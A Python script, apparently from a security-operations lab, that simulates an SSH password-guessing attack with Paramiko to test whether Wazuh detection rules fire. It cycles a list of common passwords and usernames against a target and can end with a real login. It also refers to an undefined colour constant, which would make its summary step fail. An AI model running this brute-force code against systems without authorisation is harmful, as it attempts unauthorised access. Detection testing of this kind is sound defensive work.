#!/usr/bin/env python3
# =============================================================================
# simulate-brute-force.py — SSH Brute Force Attack Simulation
# Author: SOC Lab Project
# Description: Simulates a rapid SSH brute force attack by making repeated
#              failed authentication attempts against a target host. Designed
#              to trigger Wazuh custom rules 100001 (brute force threshold)
#              and optionally 100002 (successful login after brute force).
#              Uses Paramiko for SSH connections — no external attack tools.
# MITRE ATT&CK: T1110.001 — Brute Force: Password Guessing
# Usage: python3 simulate-brute-force.py --target 192.168.1.100
#                                        --user root
#                                        --attempts 15
#                                        [--succeed]
# WARNING: Only run against systems you own or have written permission to test.
# =============================================================================

import os
import sys
import time
import socket
import argparse
import logging
import subprocess
from datetime import datetime

# Try to import paramiko — install if missing
try:
    import paramiko
except ImportError:
    print("[INFO] paramiko not installed — installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install",
                           "paramiko", "--quiet"])
    import paramiko

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
log = logging.getLogger(__name__)

# ── Colour output ──────────────────────────────────────────────────────────────
RED    = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
CYAN   = "\033[96m"; BOLD  = "\033[1m";  RESET  = "\033[0m"

def c(text, code): return f"{code}{text}{RESET}"


# ── Wordlists ─────────────────────────────────────────────────────────────────
# Realistic but intentionally wrong passwords — these will all fail
WRONG_PASSWORDS = [
    "password", "123456", "admin", "root", "toor",
    "Password1", "letmein", "qwerty", "abc123", "monkey",
    "master", "dragon", "sunshine", "princess", "welcome",
    "shadow", "superman", "michael", "football", "Password123!",
]

COMMON_USERNAMES = [
    "root", "admin", "administrator", "ubuntu", "ec2-user",
    "pi", "vagrant", "deploy", "git", "oracle", "postgres",
]


# ── SSH brute force function ───────────────────────────────────────────────────
def attempt_ssh_login(host: str, port: int, username: str,
                      password: str, timeout: float = 3.0) -> bool:
    """
    Attempt a single SSH login. Returns True if successful, False otherwise.
    All exceptions (auth failure, connection refused, etc.) return False.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname  = host,
            port      = port,
            username  = username,
            password  = password,
            timeout   = timeout,
            banner_timeout  = timeout,
            auth_timeout    = timeout,
            look_for_keys   = False,
            allow_agent     = False,
        )
        client.close()
        return True   # Successful login

    except paramiko.AuthenticationException:
        return False  # Correct behaviour — auth rejected

    except (paramiko.ssh_exception.NoValidConnectionsError,
            socket.timeout, ConnectionRefusedError,
            OSError) as exc:
        log.warning(f"Connection issue to {host}:{port} — {exc}")
        return False

    except Exception as exc:
        log.debug(f"SSH attempt exception: {exc}")
        return False

    finally:
        try:
            client.close()
        except Exception:
            pass


# ── Verify target is reachable ────────────────────────────────────────────────
def check_target_reachable(host: str, port: int, timeout: float = 5.0) -> bool:
    """TCP connect check to verify SSH port is open before starting."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# ── Main simulation ────────────────────────────────────────────────────────────
def run_brute_force_simulation(
    target: str,
    port: int,
    username: str,
    num_attempts: int,
    delay: float,
    succeed: bool,
    success_password: str,
    multi_user: bool,
) -> dict:
    """
    Execute the brute force simulation. Returns summary dict.
    """
    results = {
        "target":         target,
        "port":           port,
        "username":       username,
        "total_attempts": 0,
        "failures":       0,
        "success":        False,
        "start_time":     datetime.now().isoformat(),
        "end_time":       None,
        "rule_100001_expected": False,
        "rule_100002_expected": False,
    }

    print()
    print(c("═" * 60, CYAN))
    print(c("  ATOMIC RED TEAM — SSH Brute Force Simulation", BOLD))
    print(c("  MITRE ATT&CK: T1110.001", BOLD))
    print(c("═" * 60, CYAN))
    print(f"  Target      : {c(target, BOLD)}:{port}")
    print(f"  Username(s) : {c(username if not multi_user else 'multiple', BOLD)}")
    print(f"  Attempts    : {c(str(num_attempts), BOLD)}")
    print(f"  Delay       : {c(str(delay) + 's', BOLD)} between attempts")
    print(f"  Will Succeed: {c(str(succeed), BOLD)}")
    print(c("═" * 60, CYAN))
    print()

    # Pre-flight: check target is reachable
    log.info(f"Checking target {target}:{port} is reachable...")
    if not check_target_reachable(target, port):
        log.error(f"Cannot reach {target}:{port} — is SSH running?")
        print(c(f"[ERROR] Cannot connect to {target}:{port}", RED))
        sys.exit(1)
    log.info(f"Target reachable — starting simulation")

    # Build username list
    usernames = COMMON_USERNAMES[:5] if multi_user else [username]
    attempt_num = 0

    print(c("  Phase 1: Generating authentication failures...", YELLOW))
    print()

    # Fire wrong password attempts
    for i in range(num_attempts):
        current_user = usernames[i % len(usernames)]
        password     = WRONG_PASSWORDS[i % len(WRONG_PASSWORDS)]
        attempt_num += 1

        success = attempt_ssh_login(target, port, current_user,
                                    password, timeout=3.0)
        results["total_attempts"] += 1

        if success:
            # Unexpected success with wrong password — log it
            log.warning(f"  Unexpected success with '{password}' — "
                        f"this password is actually correct!")
            results["success"] = True
        else:
            results["failures"] += 1
            status = c("FAIL", RED)
            log.info(
                f"  Attempt {attempt_num:>2}/{num_attempts}  "
                f"user={current_user:<12}  pass={password:<20}  [{status}]"
            )

        # Check if we've crossed the threshold for rule 100001
        if results["failures"] >= 10:
            results["rule_100001_expected"] = True

        time.sleep(delay)

    print()

    # Optional: attempt successful login to trigger rule 100002
    if succeed:
        print(c("  Phase 2: Attempting successful login (rule 100002)...", YELLOW))
        print()

        if not success_password:
            log.warning("--succeed flag set but no --success-password provided")
            log.warning("Skipping successful login phase")
        else:
            log.info(f"  Attempting login with correct credentials: "
                     f"user={username} pass=***")
            time.sleep(1)   # Small pause to match real attack cadence

            success = attempt_ssh_login(
                target, port, username, success_password, timeout=5.0
            )
            results["total_attempts"] += 1

            if success:
                results["success"] = True
                results["rule_100002_expected"] = True
                log.info(c("  SUCCESS: Login succeeded — rule 100002 should fire!", GREEN))
            else:
                log.warning("  Login with provided password failed — "
                            "check credentials")
        print()

    results["end_time"] = datetime.now().isoformat()
    return results


# ── Print summary ─────────────────────────────────────────────────────────────
def print_summary(results: dict) -> None:
    """Print simulation summary and expected detection outcome."""
    print(c("═" * 60, CYAN))
    print(c("  SIMULATION COMPLETE — EXPECTED DETECTIONS", BOLD))
    print(c("═" * 60, CYAN))
    print()
    print(f"  Total Attempts  : {results['total_attempts']}")
    print(f"  Failures        : {c(str(results['failures']), RED)}")
    print(f"  Logins Succeeded: "
          f"{c('YES', GREEN) if results['success'] else c('NO', DIM)}")
    print()

    print(c("  Expected Wazuh Alerts:", BOLD))
    r1 = results["rule_100001_expected"]
    r2 = results["rule_100002_expected"]
    print(f"  Rule 100001 (Brute Force)   : "
          f"{c('SHOULD FIRE', GREEN) if r1 else c('NOT EXPECTED', DIM)}")
    print(f"  Rule 100002 (Success After) : "
          f"{c('SHOULD FIRE', GREEN) if r2 else c('NOT EXPECTED', DIM)}")
    print()

    print(c("  Verification Commands:", BOLD))
    print(c("  # Check Wazuh dashboard for rule 100001/100002", DIM))
    print(c("  python3 scripts/testing/verify-detections.py "
            "--simulation brute-force --since 10", DIM))
    print()

    print(c("  TheHive:", BOLD))
    print(c("  Check for auto-created case in TheHive if Shuffle is running", DIM))
    print(c("  Open: http://localhost:9000", DIM))
    print()
    print(c("═" * 60, CYAN))


# ── Argument parser ────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Simulate SSH brute force attack to test Wazuh detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic 15-attempt brute force
  python3 simulate-brute-force.py --target 172.20.0.100

  # Brute force that succeeds at the end (triggers rule 100002)
  python3 simulate-brute-force.py --target 172.20.0.100 \\
    --succeed --success-password 'ActualPassword123'

  # Multi-user brute force with fast pacing
  python3 simulate-brute-force.py --target 172.20.0.100 \\
    --multi-user --attempts 20 --delay 0.3
        """
    )
    parser.add_argument("--target",   required=True,
                        help="Target host IP or hostname")
    parser.add_argument("--port",     type=int, default=22,
                        help="SSH port (default: 22)")
    parser.add_argument("--user",     default="root",
                        help="Username to target (default: root)")
    parser.add_argument("--attempts", type=int, default=15,
                        help="Number of failed attempts (default: 15, min 11 to trigger rule)")
    parser.add_argument("--delay",    type=float, default=0.5,
                        help="Seconds between attempts (default: 0.5)")
    parser.add_argument("--succeed",  action="store_true",
                        help="Attempt a successful login at the end (triggers rule 100002)")
    parser.add_argument("--success-password", default="",
                        help="Correct password to use for --succeed phase")
    parser.add_argument("--multi-user", action="store_true",
                        help="Cycle through multiple common usernames")
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    print()
    print(c("  ⚠  AUTHORISATION REMINDER", YELLOW + BOLD))
    print(c("  Only run this against systems you own or have written", YELLOW))
    print(c("  permission to test. Unauthorised use is illegal.", YELLOW))
    print()

    results = run_brute_force_simulation(
        target           = args.target,
        port             = args.port,
        username         = args.user,
        num_attempts     = max(args.attempts, 11),
        delay            = args.delay,
        succeed          = args.succeed,
        success_password = args.success_password,
        multi_user       = args.multi_user,
    )

    print_summary(results)


if __name__ == "__main__":
    main()
